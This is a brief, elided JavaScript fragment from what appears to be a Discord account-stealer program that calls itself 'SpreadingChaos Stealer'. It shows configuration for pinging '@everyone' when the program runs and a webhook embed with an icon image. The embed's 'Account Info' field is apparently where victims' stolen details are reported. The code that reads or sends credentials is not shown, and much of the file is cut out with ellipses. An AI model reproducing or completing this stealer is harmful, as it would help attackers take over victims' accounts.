...
const config = {
  ...
  ping_on_run: true,
  ping_val: '@everyone',
  embed_name: 'SpreadingChaos Stealer',
  embed_icon: 'https://media.discordapp.net/attachments/1010559618780504137/1010560430835503195/wallpaperbetter_1.jpg?width=856&height=451'.replace(/ /g, '%20'),
  embed_color: 000000,
    ...
    embeds: [
      {
        ...
        image: {
            url: 'https://media.discordapp.net/attachments/1010559618780504137/1010560430835503195/wallpaperbetter_1.jpg?width=856&height=451',
        },
        fields: [
          {
            name: '**Account Info**',
